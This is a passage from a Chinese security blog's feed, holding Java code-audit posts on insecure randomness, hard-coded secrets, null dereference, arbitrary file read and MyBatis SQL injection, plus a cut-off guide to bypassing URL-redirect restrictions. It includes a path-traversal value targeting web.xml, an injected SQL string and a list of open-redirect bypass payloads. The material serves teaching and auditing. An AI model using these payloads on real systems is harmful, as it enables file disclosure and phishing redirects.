    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#1-insecure-randomness">1、Insecure Randomness</a><ul><li><a href="#11-描述">1.1、描述：</a></li><li><a href="#12-审计方法">1.2、审计方法：</a></li><li><a href="#13-漏洞示例">1.3、漏洞示例:</a></li><li><a href="#14-漏洞危害">1.4、漏洞危害：</a></li><li><a href="#15-修复方案">1.5、修复方案：</a></li></ul></li></ul><!-- tocstop --><h1><span id="1-insecure-randomness">1、Insecure Randomness</span></h1><h2><span id="11-描述">1.1、描述：</span></h2><ul><li><font face="微软雅黑">伪随机数生成器（PRNG）使用确定性数学算法来产生具有良好统计属性的数字序列。但是这种数字序列并不具有真正的随机特性。伪随机数生成器通常以一个算术种子值为起始。算法使用该种子值生成一个输出以及一个新的种子，这个种子又被用来生成下一个随机值，以此类推。<br>Java API 提供了伪随机数生成器（PRNG）—— java.util.Random类。这个伪随机数生成器具有可移植性和可重复性。因此，如果两个java.util.Random类的实例创建时使用的是相同的种子值，那么对于所有的Java实现，它们将生成相同的数字序列。在系统重启或应用程序初始化时，Seed值总是被重复使用。在一些其他情况下，seed值来自系统时钟的当前时间。攻击者可以在系统的一些安全脆弱点上监听，并构建相应的查询表预测将要使用的seed值。</font></li></ul><h2><span id="12-审计方法">1.2、审计方法：</span></h2><ul><li><p><font face="微软雅黑">全局搜索以下关键词</font></p><p>  <font face="微软雅黑">“random”</font></p></li></ul><h2><span id="13-漏洞示例">1.3、漏洞示例:</span></h2><ul><li><font face="微软雅黑">例如在易于猜测的密码、可预测的加密密钥、验证码生成、抽奖活动、UUID生成、SessionID生成、Token生成、CSRF Token、找回密码Token、游戏（随机元素的生成）、密码应用场景、生成密钥：对称密码，消息认证、生成密钥对：公钥密码，数字签名、生成IV： 用于分组密码的CBC，CFB和OFB模式、生成nonce: 用于防御重放攻击; 分组密码的CTR模式、生成盐：用于基于口令的密码PBE等，可能会降低系统安全性。<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H0a6d84344a8a4831973a1a50706be5ecy.png" style="zoom:30%"></center></font></font></li></ul><p><font face="微软雅黑"><center>图1：漏洞代码</center></font></p><h2><span id="14-漏洞危害">1.4、漏洞危害：</span></h2><ul><li><font face="微软雅黑">生成的随机数很容易预测，可能会降低系统安全性。</font></li></ul><h2><span id="15-修复方案">1.5、修复方案：</span></h2><ul><li><font face="微软雅黑">因此，java.util.Random类不能用于安全敏感应用或者敏感数据保护。应使用更加安全的随机数生成器，例如java.security.SecureRandom类。<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H828ae4843a814538b5321ebcc13276f1N.png" style="zoom:30%"></center></font></font></li></ul><p><font face="微软雅黑"><center>图2：修复代码</center></font></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-insecure-randomness&quot;&gt;1、Insecure Randomness&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-描述&quot;&gt;1.1、描述：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#12
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://www.vkxss.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java代码审计" scheme="http://www.vkxss.top/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>敏感信息硬编码在程序中</title>
    <link href="http://www.vkxss.top/2019/08/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%A1%AC%E7%BC%96%E7%A0%81%E5%9C%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD/"/>
    <id>http://www.vkxss.top/2019/08/22/代码审计-敏感信息硬编码在程序中/</id>
    <published>2019-08-22T04:25:40.000Z</published>
    <updated>2019-09-20T02:01:39.853Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#1-敏感信息硬编码在程序中">1、敏感信息硬编码在程序中</a><ul><li><a href="#11-描述">1.1、描述：</a></li><li><a href="#12-审计方法">1.2、审计方法：</a></li><li><a href="#13-漏洞示例">1.3、漏洞示例:</a></li><li><a href="#14-漏洞危害">1.4、漏洞危害：</a></li><li><a href="#15-修复方案">1.5、修复方案：</a></li></ul></li></ul><!-- tocstop --><h1><span id="1-敏感信息硬编码在程序中">1、敏感信息硬编码在程序中</span></h1><h2><span id="11-描述">1.1、描述：</span></h2><ul><li><font face="微软雅黑">如果将敏感信息（包括口令和加密密钥）硬编码在程序中，可能会将敏感信息暴露给攻击者。任何能够访问到class文件的人都可以反编译class文件并发现这些敏感信息。因此，不能将信息硬编码在程序中。同时，硬编码敏感信息会增加代码管理和维护的难度。</font></li></ul><h2><span id="12-审计方法">1.2、审计方法：</span></h2><ul><li><p><font face="微软雅黑">全局搜索以下关键词</font></p><p>  <font face="微软雅黑">“password”</font></p></li></ul><h2><span id="13-漏洞示例">1.3、漏洞示例:</span></h2><ul><li><font face="微软雅黑">恶意用户可以使用javap -c IPaddress命令来反编译class来发现其中硬编码的服务器IP地址。反编译器的输出信息透露了服务器的明文IP地址：172.16.254.1。</font><br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H275d6113fe3d434284c6321eb4f9bf92C.png" style="zoom:30%"></center></font></li></ul><p><font face="微软雅黑"><center>图1：错误代码</center></font></p><h2><span id="14-漏洞危害">1.4、漏洞危害：</span></h2><ul><li><font face="微软雅黑">很容易被攻击者利用，导致系统敏感信息泄露。</font></li></ul><h2><span id="15-修复方案">1.5、修复方案：</span></h2><ul><li><font face="微软雅黑">敏感信息存放在配置文件或数据库中并加密存储。(金融行业安全系数更高)</font></li><li><font face="微软雅黑">这个正确代码示例从一个安全目录下的外部文件获取服务器IP地址。并在其使用完后立即从内存中将其清除可以防止后续的信息泄露。<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H3ccd8617113b4a349c96030085c23212T.png" style="zoom:30%"></center></font></font></li></ul><p><font face="微软雅黑"><center>图2：正确代码</center></font></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-敏感信息硬编码在程序中&quot;&gt;1、敏感信息硬编码在程序中&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-描述&quot;&gt;1.1、描述：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#12-审计方法&quot;&gt;1.2、审计方法：
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://www.vkxss.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java代码审计" scheme="http://www.vkxss.top/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Null Dereference</title>
    <link href="http://www.vkxss.top/2019/08/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Null%20Dereference/"/>
    <id>http://www.vkxss.top/2019/08/20/代码审计-Null Dereference/</id>
    <published>2019-08-20T07:23:43.000Z</published>
    <updated>2019-09-20T02:01:46.172Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#1-null-dereference空指针异常">1、Null Dereference（空指针异常）</a><ul><li><a href="#11-产生原因">1.1、产生原因：</a></li><li><a href="#22-修复方案">2.2、修复方案：</a></li></ul></li></ul><!-- tocstop --><h1><span id="1-null-dereference空指针异常">1、Null Dereference（空指针异常）</span></h1><h2><span id="11-产生原因">1.1、产生原因：</span></h2><ul><li><p><font face="微软雅黑">当违反程序员的一个或多个假设时，通常会出现 null 指针异常。如果程序明确将对象设置为null，但稍后却间接引用该对象，则将出现 dereference-after-store 错误。此错误通常是因为程序员在声明变量时将变量初始化为 null。<br>大部分空指针问题只会引起一般的软件可靠性问题，但如果攻击者能够故意触发空指针间接引用，攻击者就有可能利用引发的异常绕过安全逻辑，或致使应用程序泄漏调试信息，这些信息对于规划随后的攻击十分有用。</font></p></li><li><p><font face="微软雅黑">示例：在下列代码中，程序员将变量 foo 明确设置为 null。稍后，程序员间接引用 foo，而未检查对象是否为 null 值。</font><br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H08f4d65504114216b3e145c0aade8e95w.png" style="zoom:50%"></center></font></p></li></ul><p><font face="微软雅黑"><center>图1：引起Null Dereference漏洞的代码</center></font></p><h2><span id="22-修复方案">2.2、修复方案：</span></h2><ul><li><font face="微软雅黑">在间接引用可能为 null 值的对象之前，请务必仔细检查。如有可能，在处理资源的代码周围的包装器中纳入 null 检查，确保在所有情况下均会执行 null 检查，并最大限度地减少出错的地方。<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H36460ed505d046b085a00ee8fd339827Y.png" style="zoom:50%"></center></font></font></li></ul><p><font face="微软雅黑"><center>图2：修复Null Dereference漏洞后的代码</center></font></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-null-dereference空指针异常&quot;&gt;1、Null Dereference（空指针异常）&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-产生原因&quot;&gt;1.1、产生原因：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://www.vkxss.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java代码审计" scheme="http://www.vkxss.top/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>任意文件读取</title>
    <link href="http://www.vkxss.top/2019/08/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    <id>http://www.vkxss.top/2019/08/19/代码审计-任意文件读取/</id>
    <published>2019-08-19T06:13:12.000Z</published>
    <updated>2019-09-20T02:01:42.114Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#1-any-file-read任意文件读取">1、Any File Read（任意文件读取）</a><ul><li><a href="#11-描述">1.1、描述：</a></li><li><a href="#12-审计方法">1.2、审计方法：</a></li><li><a href="#13-漏洞示例">1.3、漏洞示例:</a></li><li><a href="#13-漏洞危害">1.3、漏洞危害:</a></li><li><a href="#14-修复方案">1.4、修复方案：</a></li></ul></li></ul><!-- tocstop --><h1><span id="1-any-file-read任意文件读取">1、Any File Read（任意文件读取）</span></h1><h2><span id="11-描述">1.1、描述：</span></h2><ul><li><font face="微软雅黑">任意文件读取漏洞（Unrestricted File Upload），是一种常见的Web安全漏洞，因Web程序提供的文件查看下载、附件下载等功能存在安全缺陷，导致通过修改文件路径就能够查看和下载任意文件，这些文件包括：源代码文件、系统文件（/etc/passwd、C:/boot.ini等）、配置文件（config.php、/WEB-INF/web.xml、web.config等），造成网站敏感信息泄露，严重危害网站安全。</font></li></ul><h2><span id="12-审计方法">1.2、审计方法：</span></h2><ul><li><p><font face="微软雅黑">全局搜索以下关键词:</font></p><p>  <font face="微软雅黑">“fileName”,<br>  <font face="微软雅黑">“filePath”,<br>  <font face="微软雅黑">“getFile”,<br>  <font face="微软雅黑">“getWriter”,<br>  <font face="微软雅黑">“MultipartFile”,<br>  <font face="微软雅黑">“createNewFile”,<br>  <font face="微软雅黑">“FileInputStream”</font></font></font></font></font></font></font></p></li></ul><h2><span id="13-漏洞示例">1.3、漏洞示例:</span></h2><ul><li><font face="微软雅黑">代码在 downloadFile()函数中获取请求参数中的affixalName的值，然后赋值给 FileName 变量，接着在 196 行处通过拼接字符串赋值给downPath 变量，然后在 198 行处调用 download 函数并把 downPath 的值传进函数，download 函数的代码如下:<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H9f9396106a6c41b39c4174b28d2a06a47.jpg" style="zoom:30%"></center></font></font></li></ul><p><font face="微软雅黑"><center>图1：漏洞代码</center></font></p><ul><li><font face="微软雅黑">download 函数把 filePath 处的文件写到 http 响应中，在整个流程中并没有对文件名的合法 性进行检查，存在任意文件下载漏洞，如通过把 affixalName 的值设置 为../../../WEB-INF/web.xml 可以下载网站的 web.xml 文件。<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hfe0e4a99a5ae474190c9cf983dd8385f8.jpg" style="zoom:30%"></center></font></font></li></ul><p><font face="微软雅黑"><center>图2：漏洞代码</center></font><br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H17db51d7689144138769210fb9fcd6478.png" style="zoom:30%"></center></font></p><p><font face="微软雅黑"><center>图3：漏洞代码</center></font></p><h2><span id="13-漏洞危害">1.3、漏洞危害:</span></h2><ul><li><font face="微软雅黑">任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取的配置信息甚至系统重要文件。严重的话，就可能导致SSRF，进而漫游至内网。</font></li></ul><h2><span id="14-修复方案">1.4、修复方案：</span></h2><ul><li><font face="微软雅黑">指定下载路径以防止用户读取和下载指定目录以外的文件。</font></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-any-file-read任意文件读取&quot;&gt;1、Any File Read（任意文件读取）&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-描述&quot;&gt;1.1、描述：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://www.vkxss.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java代码审计" scheme="http://www.vkxss.top/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Mybatis检查SQL注入</title>
    <link href="http://www.vkxss.top/2019/08/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Mybatis%E6%A3%80%E6%9F%A5SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://www.vkxss.top/2019/08/15/代码审计-Mybatis检查SQL注入/</id>
    <published>2019-08-15T06:10:40.000Z</published>
    <updated>2019-11-06T16:18:07.222Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#mybatis检查sql注入总结">Mybatis检查SQL注入总结</a><ul><li><a href="#mybatis的-和-的由来">Mybatis的#{ }和${ }的由来#</a></li><li><a href="#如何排查">如何排查</a></li><li><a href="#为什么-就安全">为什么#{ }就安全</a></li><li><a href="#什么情况下用不了">什么情况下用不了#{}</a></li><li><a href="#如何解决">如何解决：</a></li><li><a href="#总结">总结：</a></li></ul></li></ul><!-- tocstop --><h2><span id="mybatis检查sql注入总结">Mybatis检查SQL注入总结</span></h2><h3><span id="mybatis的-和-的由来">Mybatis的#{ }和${ }的由来</span></h3><ul><li><p>Mybatis的Mapper.xml语句中parameterType向SQL语句传参有两种方式：#{ }和${ }。</p></li><li><p>使用#{ }来防止SQL注入，使用${ }来动态拼接参数。</p></li></ul><h3><span id="如何排查">如何排查</span></h3><ul><li><p>检查是否有$号</p><ul><li>如果你使用的是IDEA，那么通过快捷键Ctrl+Shift+R打开窗口，通过全局搜索${ , 快速定位到使用${ }拼接SQL的语句，在去找到外部传入参数的入口，闭合sql证明即可。</li></ul></li><li><p>检查是否有order by</p><ul><li>同样的在搜索是否使用order by 排序语句，如果有一步一步追踪是否有外部参数，未过滤就直接传递到order by语句里面来。</li></ul></li></ul><h3><span id="为什么-就安全">为什么#{ }就安全</span></h3><ul><li><p>因为”#{}”采用JDBC预编译模式，这种写法可以很好地避免SQL注入漏洞的产生。类似如下SQL语句，</p></li><li><p>使用 ${ }效果是:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from testtable where id=&quot;1&quot; or true or id  # 1后面就是被攻击者恶意构造的字符</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MiODTe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/07/MiODTe.jpg" alt="MiODTe.jpg"></a></p></li><li><p>而使用 #{ } 的效果是:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from testtable where id=&quot;1\&quot; or true or id\&quot;&quot;   # 1后面就是被攻击者恶意构造的字符</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MiOdOK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/07/MiOdOK.jpg" alt="MiOdOK.jpg"></a></p></li></ul><h3><span id="什么情况下用不了">什么情况下用不了#{}</span></h3><ul><li><p>order by 排序情况不行。为什么？</p></li><li><p>先复习一下order by的用法：#<br>order by就是一个排序的工具，跟我读一遍：“order by就是一个排序的工具”。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 这个1就是指第一个列索引，也可以写id （列索引）</span><br><span class="line">select * from testtable ORDER BY 1 ASC #ASC表示按升序排序,DESC表示按降序排序</span><br><span class="line"># 两个代码是一样的</span><br><span class="line">select * from testtable ORDER BY id ASC #ASC表示按升序排序,DESC表示按降序排序</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MiOBwD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/07/MiOBwD.jpg" alt="MiOBwD.jpg"></a></p></li><li><p>对于order by 我们是用不了#{}的，因为用了这个就会被自动转换成字符串，自动加引号，这样语句就不生效了。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;selectStudentsByName&quot; resultType=&quot;Student&quot;&gt;</span><br><span class="line">    select id,name,age,score from student order by #&#123;column&#125;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;!--编译出来的结果如下：--&gt;</span><br><span class="line">select * from table order by &apos;column&apos;</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MiO0eO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/07/MiO0eO.jpg" alt="MiO0eO.jpg"></a></p></li><li><p>会发现加上“” 双引号符号后，就没法正常排序了。</p></li></ul><h3><span id="如何解决">如何解决：</span></h3><ul><li>使用${}，MyBatis就不会修改或转义改字符串。但是这样又不安全，会导致潜在的SQL注入攻击。所以我们需要自己去限制，不允许用户输入一些非法字段，或者通常自行转义并检查。所以这必须过滤输入的内容。</li></ul><h3><span id="总结">总结：</span></h3><ul><li>即使是安全的sql预编译技术，也是有适用范围的，一些应用场景也是不适用的。当我们在做黑盒或者审计的时候，碰到了预编译处理不了的场景，比如说排序功能的时候就得格外注意，因为这里不仔细审查，日后就是一个祸端。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#mybatis检查sql注入总结&quot;&gt;Mybatis检查SQL注入总结&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#mybatis的-和-的由来&quot;&gt;Mybatis的#{ }和${ }的由来#&lt;/a&gt;&lt;/li&gt;
&lt;li
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://www.vkxss.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java代码审计" scheme="http://www.vkxss.top/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>如何绕过URL限制</title>
    <link href="http://www.vkxss.top/2019/07/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87URL%E9%99%90%E5%88%B6/"/>
    <id>http://www.vkxss.top/2019/07/20/渗透测试-如何绕过URL限制/</id>
    <published>2019-07-20T04:25:40.000Z</published>
    <updated>2019-09-23T08:02:38.060Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#1-如何绕过url限制">1、如何绕过URL限制</a><ul><li><a href="#11-描述">1.1、描述：</a></li><li><a href="#12-正常思路">1.2、正常思路：</a></li><li><a href="#13-payload">1.3、payload：</a></li><li><a href="#14-bypass">1.4、Bypass</a><ul><li><a href="#0x01-利用问号绕过限制">0x01 利用问号绕过限制</a></li><li><a href="#0x02-利用反斜杠和正斜杠绕过限制">0x02 利用反斜杠和正斜杠绕过限制</a></li><li><a href="#0x03-利用绕过url限制">0x03 利用@绕过URL限制</a></li><li><a href="#0x04-利用白名单缺陷绕过限制">0x04 利用白名单缺陷绕过限制</a></li><li><a href="#0x05-多重验证跳转绕过限制">0x05 多重验证&amp;跳转绕过限制</a></li><li><a href="#0x06-点击触发达到绕过url跳转限制">0x06 点击触发达到绕过URL跳转限制</a></li><li><a href="#0x07-利用xipio绕过">0x07 利用xip.io绕过</a></li><li><a href="#0x08-利用超链接绕过可信站点限制">0x08 利用超链接绕过可信站点限制</a></li><li><a href="#0x09-post参数中的url跳转">0x09 POST参数中的URL跳转</a></li><li><a href="#0x10-利用号绕过">0x10 利用#号绕过</a></li><li><a href="#0x09-fuzz">0x09 FUZZ</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="1-如何绕过url限制">1、如何绕过URL限制</span></h1><h2><span id="11-描述">1.1、描述：</span></h2><ul><li><font face="微软雅黑">URL重定向漏洞（URL redirection vulnerability），是一种常见的Web安全漏洞，由于网站URL重定向功能设计不当，没有验证跳转的目标URL是否合法，用户可通过此漏洞跳转到任意网站，这会导致可通过该网站跳转到存在木马、病毒的网站或者钓鱼网站，损害网站用户权利、网站名誉。</font></li></ul><h2><span id="12-正常思路">1.2、正常思路：</span></h2><ul><li><font face="微软雅黑">就是直接替换后面的URL来检测是否存在任意URL跳转，如果不存在，就直接返回到它自己的域名，如果存在，就跳转到你指定的URL</font></li></ul><h2><span id="13-payload">1.3、payload：</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">- ///www.baidu.com/%2f%2e%2e</span><br><span class="line">- /https://%5cbaidu.com/</span><br><span class="line">- //www.baidu.com</span><br><span class="line">- /www.baidu.com</span><br><span class="line">- https://www.google.com/www.baidu.com</span><br><span class="line">- /%2Fbaidu%252Ecom</span><br><span class="line">- http://www.google.com\.baidu.com</span><br><span class="line">- http://www.google.com\@baidu.com</span><br><span class="line">- http://www.google.com\#baidu.com</span><br><span class="line">- http://www.google.com\?baidu.com</span><br><span class="line">- http://www.google.com\\baidu.com</span><br><span class="line">- http://www.google.com\baidu.com:</span><br></pre></td></tr></table></figure><h2><span id="14-bypass">1.4、Bypass</span></h2><h3><span id="0x01-利用问号绕过限制">0x01 利用问号绕过限制</span></h3><ul><li><font face="微软雅黑">利用问号，这是一个特性，利用问号可以成功绕过URL限制<br>比如：<a href="http://www.aaa.com/acb?Url=http://login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://login.aaa.com</a> 这是一个跳转链接，跳转到它的二级域名下，那么这个问号放哪里可以绕过呢？其实就是放到它自身的域名前面也就是你添加的想要跳转的域名的后面，如：<a href="http://www.aaa.com/acb?Url=http://test.com?login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com?login.aaa.com</a> 那么，它其实是会跳转到这个test.com域名下，这个域名是我想要跳转的任意域名，而后面的它自身域名一定要带上，不带上就无法辅助用问号?这个特性来跳转到指定域名了，而跳转后，问号和问号后面的内容会变为这样：<a href="http://www.test.com/?login.aaa.com" target="_blank" rel="noopener">http://www.test.com/?login.aaa.com</a></font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：http://www.test.com/abc？url=http//payload.com?test1.com</span><br></pre></td></tr></table></figure><h3><span id="0x02-利用反斜杠和正斜杠绕过限制">0x02 利用反斜杠和正斜杠绕过限制</span></h3><ul><li><font face="微软雅黑">比如：<a href="http://www.aaa.com/acb?Url=http://login.aaa.com/" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://login.aaa.com/</a> 同样是在它本身域名前加上正斜杠，然后正斜杠前面跟上你想跳转的域名地址。<br>如：<a href="http://www.aaa.com/acb?Url=http://test.com/login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com/login.aaa.com</a><br>反斜杠有三种思路<br>两个反斜杠绕过方法<br>比如：<a href="http://www.aaa.com/acb?Url=http://login.aaa.com/" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://login.aaa.com/</a> 同样是在它本身域名前加上两个反斜杠，然后两个反斜杠前面跟上你想跳转的域名地址。<br>如：<a href="http://www.aaa.com/acb?Url=http://test.com\login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com\login.aaa.com</a><br>一个反斜杠绕过方法<br>如：<a href="http://www.aaa.com/acb?Url=http://test.comlogin.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.comlogin.aaa.com</a><br>另一种思路，一个反斜杠一个点<br>利用.这样的格式，也就是一个反斜杠加一个点来跳过限制，<br>如：<a href="http://www.aaa.com/acb?Url=http://test.com.login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com.login.aaa.com</a></font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：/ \  .</span><br></pre></td></tr></table></figure><h3><span id="0x03-利用绕过url限制">0x03 利用@绕过URL限制</span></h3><ul><li><font face="微软雅黑">如果你用这方法在火狐里进行跳转，会有弹窗提示，在其它游览器则没有。<br>如：&lt;a href=”<a href="http://www.aaa.com/acb?Url=http://login.aaa.com@test.com“”&gt;http://www.aaa.com/acb?Url=http://login.aaa.com@test.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://login.aaa.com@test.com“”&gt;http://www.aaa.com/acb?Url=http://login.aaa.com@test.com</a> 后面的test.com就是要跳转到的域名，前面的域名都是用来辅助以绕过限制的。</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：@</span><br></pre></td></tr></table></figure><h3><span id="0x04-利用白名单缺陷绕过限制">0x04 利用白名单缺陷绕过限制</span></h3><ul><li><font face="微软雅黑">有的域名白名单限制是不全的，比如如果想利用一个跳转，而这个跳转是通用，在这个公司网站很多子域名等都可以跳转，那么你买个域名也不算贵对吧。<br>为什么这么说呢，这个问题就是白名单限制不当，比如，当跳转的域名包含这个网站下的所有域名，比如：<a href="http://www.aaa.com/acb?Url=http://login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://login.aaa.com</a><br>这个login.aaa.com也可以改成aaa.com同样可以跳转对吧，因为白名单里只要有包含这个域名就直接成功跳转。<br>那么当我在这个域名前面加上如testaaa.com，白名单里会检查是否包含aaa.com这个域名，如果包含，就直接跳转，而并没有检查这个域名的整个信息，然后可以利用这个问题，直接注册一个testaaa.com这个域名就可以利用这个跳转。</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:testaaa.com</span><br></pre></td></tr></table></figure><h3><span id="0x05-多重验证amp跳转绕过限制">0x05 多重验证&amp;跳转绕过限制</span></h3><ul><li><font face="微软雅黑">现在很多网站都有多重验证，比如你登陆账户后会出现另一个验证页面，输入手机验证码进行验证，此时这上面的URL很可能存在任意跳转的问题。<br>多重跳转的问题导致可绕过URL限制<br>比如<a href="http://www.aaa.com/acb?Url=http" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http</a>: … ttp://login.aaa.com<br>当然，还有多重的，这个结构的多重跳转你修改最后面的URL就可以达到任意URL跳转，中间的URL就没必要动了。</font></li></ul><h3><span id="0x06-点击触发达到绕过url跳转限制">0x06 点击触发达到绕过URL跳转限制</span></h3><ul><li><font face="微软雅黑">比如很多登陆页面的地方，其URL是一个跳转的URL<br>如：<a href="http://www.aaa.com/acb?Url=http://test.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com</a><br>你直接修改了后面为任意URL，但是还是停留在原地，似乎没什么问题，但是，当你输入账号和密码后点击登陆按钮后，就会触发跳转。<br>当然，这个账户和密码不一定要对的，随便都可以，但得视系统而定吧。<br>这个我遇到了很多，比如你修改了域名，然后点击登陆，登陆成功后便可触发跳转，这也是一个比较隐蔽的绕过URL限制的跳转。</font></li></ul><h3><span id="0x07-利用xipio绕过">0x07 利用xip.io绕过</span></h3><ul><li><font face="微软雅黑">这个我还没有在测试中应用过，其请求是<a href="http://www.127.0.0.1.xip.io" target="_blank" rel="noopener">http://www.127.0.0.1.xip.io</a> 